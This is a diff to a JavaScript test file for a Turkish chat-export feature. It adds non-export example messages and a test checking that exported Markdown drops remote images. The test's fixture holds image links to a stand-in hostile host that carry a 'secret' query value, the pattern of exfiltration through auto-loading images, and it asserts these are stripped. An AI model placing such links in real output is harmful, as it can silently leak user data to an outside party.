@@ -156,6 +156,10 @@ test("a request for a file, with or without a question in it", () => {
     "keyword listesini ver",
     "password yap",
     "merhaba",
+    "Excel verilerini özetle",
+    "JSON verisini doğrula",
+    "word yazılımı hakkında bilgi",
+    "pdf alınan belgeleri listele",
   ];
   for (const m of no) assert.equal(exportRequest(m), null, m);
 });
@@ -167,3 +171,12 @@ test("the title isn't printed twice; a stray dot goes", () => {
   assert.equal(toMarkdown(d).match(/# Rapor/g)?.length, 1);
   assert.equal(turnOf({ answer: "15 Mi̇lyon" }).answer, "15 Milyon");
 });
+
+test("no picture in a file fetches anything; a very long answer still makes a file", () => {
+  const md = toMarkdown(exportDoc([turnOf({ answer: 'Metin ![x](https://kotu.example/?s=GIZLI) ![y][r] <img src="https://kotu.example/a">\n\n[r]: https://kotu.example/b' })]));
+  assert.ok(!md.includes("kotu.example"), md);
+  assert.ok(md.includes("[görsel: x]"));
+  const long = Array.from({ length: 150_000 }, (_, i) => `p${i}`).join("\n\n");
+  assert.ok(toText(exportDoc([turnOf({ answer: long })])).includes("p149999"));
+});
+
